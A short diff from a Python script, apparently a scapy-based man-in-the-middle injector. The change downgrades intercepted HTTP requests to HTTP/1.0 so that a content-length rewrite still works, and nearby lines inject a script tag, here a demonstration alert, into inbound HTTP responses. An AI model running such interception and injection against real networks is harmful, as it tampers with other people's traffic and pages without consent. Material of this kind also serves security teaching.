@@ -52,6 +52,9 @@ def process_packet(packet):
             #regex to find and replace field that specifies encoding types accepted
             #replace with "" - empty string
             #print(scapy_packet.show())
+            load = load.replace("HTTP/1.1", "HTTP/1.0")
+            #HTTP 1.1 sends data in chunks, which breaks the content-length replacement
+            #downgrading to HTTP 1.0
         elif scapy_packet[scapy.TCP].sport == 10000: #if this exists, packet is HTTP response inbound
             print_response(scapy_packet)
             injection_code = "<script>alert('JS injection');</script>"
